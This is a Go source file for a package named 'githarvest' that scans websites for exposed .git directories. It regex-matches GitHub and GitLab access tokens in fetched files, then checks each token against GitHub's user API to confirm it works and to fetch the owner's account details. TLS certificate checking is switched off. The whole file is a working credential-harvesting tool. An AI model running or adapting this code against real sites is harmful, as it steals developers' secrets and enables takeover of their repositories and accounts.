package githarvest

import (
	"crypto/tls"
	"encoding/json"
	"io"
	"net/http"
	"regexp"
	"strings"
	"time"
)

type Client struct {
	http *http.Client
}

func NewClient() *Client {
	return &Client{
		http: &http.Client{
			Timeout: 10 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

func (c *Client) IsGitExposed(url string) (bool, error) {
	gitUrl := url + "/.git/config"

	resp, err := c.http.Get(gitUrl)
	if err != nil {
		return false, ErrExecRequest
	}

	if resp.StatusCode != 200 {
		return false, ErrExecRequest
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, ErrReadBody
	}

	return strings.Contains(string(body), "[core]"), nil
}

func (c *Client) ExtractTokens(url, path string) ([]string, error) {
	pathUrl := url + path

	resp, err := c.http.Get(pathUrl)
	if err != nil {
		return nil, ErrExecRequest
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, ErrReadBody
	}

	reg := regexp.MustCompile(`(ghp|gho|ghu|ghs|ghr)_[0-9A-Za-z]{36}|github_pat_[0-9A-Za-z_]{80}|glpat-[A-Za-z0-9_-]{20,40}`)

	return reg.FindAllString(string(body), -1), nil
}

func (c *Client) IsValidToken(token string) (bool, error) {
	url := "https://api.github.com/user"

	req, err := http.NewRequest("GET", url, nil)

	if err != nil {
		return false, ErrCreateRequest
	}

	req.Header.Add("Authorization", "Bearer "+token)
	resp, err := c.http.Do(req)
	if err != nil {
		return false, ErrExecRequest
	}

	return bool(resp.StatusCode == 200), nil
}

func (c *Client) GetTokenInfo(token string) (*UserGithub, error) {
	url := "https://api.github.com/user"

	req, err := http.NewRequest("GET", url, nil)

	if err != nil {
		return nil, ErrCreateRequest
	}

	req.Header.Add("Authorization", "Bearer "+token)
	resp, err := c.http.Do(req)
	if err != nil {
		return nil, ErrExecRequest
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, ErrReadBody
	}

	var user UserGithub
	err = json.Unmarshal(body, &user)
	if err != nil {
		return nil, ErrDecodeJSON
	}

	return &user, nil
}
